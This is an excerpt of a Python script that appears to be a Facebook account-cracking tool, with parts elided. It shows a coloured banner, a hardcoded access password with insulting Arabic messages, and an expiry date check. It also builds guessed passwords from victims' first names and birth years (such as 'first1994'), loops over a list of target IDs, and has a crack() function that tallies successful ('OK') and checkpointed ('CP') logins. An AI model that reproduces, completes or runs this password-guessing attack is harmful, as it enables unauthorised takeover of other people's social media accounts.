...
print('\033[1;32m')
print('\033[1;32m')
print('\033[1;33m By: @R_A_J_Y ` @R_A_J_Y')
print('\033[1;32m')
...
print('       \033[1;31mR   \033[1;32mA   \033[1;33mJ  \033[1;33mY  \033[1;34m#   \033[1;35mFACEBOOK   \033[1;32m')

print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
name = input ('\x1b[38;5;202mENTER password-->>ضــع باســورد : \033[1;34m\033[2;36m')
if name == 'ayo' : 
	print('\033[1;35m بــاســورد صــحيــح. ')
	print ('اهــلا وجــه الدبــس. ')
else :
   print ('\033[1;31m باســورد خاطــى يا هطــف ‼️. ')
   exit()
#-----------------[ IMPORT-MODULE ]-------------------#
os.system('clear')                 
...
g= datetime.datetime(2022,12  , 25, 0, 00 ,0)

if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("     "+'تم انتهاء من وقت الاداة نسخه@R_A_J_Y' )
 print('\n\n')
 print(x)
...
if (x.strftime("%x"))==(g.strftime("%x")):
   ...
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print("     "+'تم انتهاء وقت اداة مقابلك @R_A_J_Y' )
    print('\n\n')
    print(x)
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				...
				if len(frs)<3:
					...
					pwv.append('first1994')
					pwv.append('first1993')
					pwv.append('first1992')
					pwv.append('first1991')
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s [ᖇᗩᒍY] %s/%s ➙ [[OK]] %s ➙ [[CP]] %s ..  %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
